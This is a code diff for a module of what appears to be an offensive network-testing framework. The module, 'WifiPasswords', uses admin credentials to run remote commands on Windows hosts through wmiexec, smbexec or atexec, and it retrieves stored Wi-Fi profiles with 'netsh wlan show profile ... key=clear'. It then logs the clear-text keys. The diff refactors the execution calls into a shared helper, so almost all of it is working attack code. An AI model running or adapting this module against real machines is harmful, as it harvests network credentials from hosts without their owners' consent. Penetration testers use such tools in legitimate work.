@@ -1,5 +1,4 @@
-from ar3.core.wmiexec import WMIEXEC
-from ar3.core.smbexec import SMBEXEC
+from ar3.ops.enum.host_enum import code_execution
 
 class WifiPasswords():
     def __init__(self):
@@ -7,6 +6,7 @@ class WifiPasswords():
         self.description    = 'Extract wifi passwords from system'
         self.author         = ['@m8r0wn']
         self.requires_admin = True
+        self.exec_methods   = ['wmiexec', 'smbexec', 'atexec']
         self.args           = {}
 
     def run(self, target, args, smb_con, loggers, config_obj):
@@ -14,13 +14,9 @@ class WifiPasswords():
         logger = loggers['console']
 
         try:
-            if args.exec_method == 'wmiexec':
-                executioner = WMIEXEC(logger, target, args, smb_con, share_name=args.fileless_sharename)
-            elif args.exec_method == 'smbexec':
-                executioner = SMBEXEC(logger, target, args, smb_con, share_name=args.fileless_sharename)
-
+            cmd     = 'netsh wlan show profiles'
+            results = code_execution(smb_con, args, target, loggers, config_obj, cmd, return_data=True).splitlines()
             # Quick n dirty error checking...
-            results = executioner.execute('netsh wlan show profiles').splitlines()
             if len (results) <= 1:
                 logger.fail([smb_con.host, smb_con.ip, self.name.upper(), "{}: {}".format(self.name, results[0])])
                 return
@@ -37,7 +33,9 @@ class WifiPasswords():
             # Get clear text passwords
             for p in profiles:
                 try:
-                    for result in executioner.execute('netsh wlan show profile name=\"{}\" key=clear'.format(p)).splitlines():
+                    cmd     = 'netsh wlan show profile name=\"{}\" key=clear'.format(p)
+                    results = code_execution(smb_con, args, target, loggers, config_obj, cmd, return_data=True).splitlines()
+                    for result in results:
                         if result.split(":")[0].strip() in ['SSID name', 'Authentication', 'Cipher', 'Key Content']:
                             logger.success([smb_con.host, smb_con.ip, self.name.upper(), result.lstrip()])
                             loggers[args.mode].info('Wifi_Passwords\t{}\t{}\t{}'.format(smb_con.host, smb_con.ip, result.lstrip()))
